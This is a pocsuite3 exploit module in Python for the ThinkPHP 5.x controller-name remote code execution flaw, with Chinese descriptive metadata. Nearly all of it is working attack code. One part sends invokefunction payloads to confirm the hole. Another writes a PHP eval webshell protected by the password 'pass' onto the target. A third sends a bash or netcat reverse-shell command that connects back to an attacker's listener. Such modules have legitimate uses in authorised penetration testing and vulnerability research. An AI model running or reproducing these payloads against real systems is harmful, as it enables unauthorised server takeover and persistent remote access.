"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = '97715'  # ssvid
    version = '1.0'
    author = ['chenghs']
    vulDate = '2018-12-09'
    createDate = '2018-12-10'
    updateDate = '2018-12-10'
    references = ['https://www.seebug.org/vuldb/ssvid-97715']
    name = 'ThinkPHP 5.x (v5.0.23及v5.1.31以下版本) 远程命令执行漏洞利用（GetShell）'
    appPowerLink = 'http://www.thinkphp.cn/'
    appName = 'thinkphp'
    appVersion = 'thinkphp5.1.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新
    ，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''攻击模式下将会生成一个一句话shell，成功返回shell地址，shell密码为pass'''

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _check(self, url):
        flag = 'Registered PHP Streams'
        data = OrderedDict([
            ("function", "call_user_func_array"),
            ("vars[0]", "phpinfo"),
            ("vars[1][]", "-1")
        ])
        payloads = [
            r"/?s=admin/\think\app/invokefunction",
            r"/admin.php?s=admin/\think\app/invokefunction",
            r"/index.php?s=admin/\think\app/invokefunction",
            r"/?s=index/\think\Container/invokefunction",
            r"/index.php?s=index/\think\Container/invokefunction",
            r"/index.php?s=index/\think\app/invokefunction"
        ]
        for payload in payloads:
            vul_url = url + payload
            r = requests.post(vul_url, data=data)

            if flag in r.text:
                return payload, dict(data)
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Postdata'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        filename = random_str(6) + ".php"
        webshell = r'''<?php echo "green day";@eval($_POST["pass"]);?>'''

        p = self._check(self.url)
        if p:
            data = p[1]
            data["vars[1][]"] = "echo%20%27{content}%27%20>%20{filename}".format(filename=filename,
                                                                                 content=quote(webshell))
            data["vars[0]"] = "system"
            vulurl = self.url + p[0]
            requests.post(vulurl, data=data)
            r = requests.get(self.url + "/" + filename)
            if r.status_code == 200 and "green day" in r.text:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/" + filename
                result['ShellInfo']['Content'] = webshell
        if not result:
            vulurl = self.url + r"/index.php?s=index/\think\template\driver\file/write&cacheFile={filename}&content={content}"
            vulurl = vulurl.format(filename=filename, content=quote(webshell))
            requests.get(vulurl)
            r = requests.get(self.url + "/" + filename)
            if r.status_code == 200 and "green day" in r.text:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/" + filename
                result['ShellInfo']['Content'] = webshell

        return self.parse_output(result)

    def _shell(self):
        # cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        cmd = self.get_option("command")
        p = self._check(self.url)
        if p:
            data = p[1]
            data["vars[0]"] = "system"
            data["vars[1][]"] = cmd
            vulurl = self.url + p[0]
            requests.post(vulurl, data=data)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
